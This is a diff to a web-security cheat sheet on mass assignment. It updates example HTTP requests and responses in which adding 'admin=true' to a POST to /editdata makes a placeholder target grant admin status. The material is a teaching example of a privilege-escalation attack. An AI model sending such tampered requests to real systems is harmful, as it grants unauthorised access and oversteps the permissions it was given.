@@ -6,22 +6,25 @@ Occurs when an app allows a user to manually add parameters in an HTTP Request &
 ## How to exploit
 - Normal request
 ```
-POST /editdata
-Host: vuln.com
+POST /editdata HTTP/1.1
+Host: target.com
+...
 
 username=daffa
 ```
+The response
 ```
 HTTP/1.1 200 OK
 ...
 
-username=daffa&admin=false
+{"status":"success","username":"daffainfo","isAdmin":"false"}
 ```
 
 - Modified Request 
 ```
-POST /editdata
-Host: vuln.com
+POST /editdata HTTP/1.1
+Host: target.com
+...
 
 username=daffa&admin=true
 ```
@@ -30,7 +33,7 @@ username=daffa&admin=true
 HTTP/1.1 200 OK
 ...
 
-username=daffa&admin=true
+{"status":"success","username":"daffainfo","isAdmin":"true"}
 ```
 
 ## References
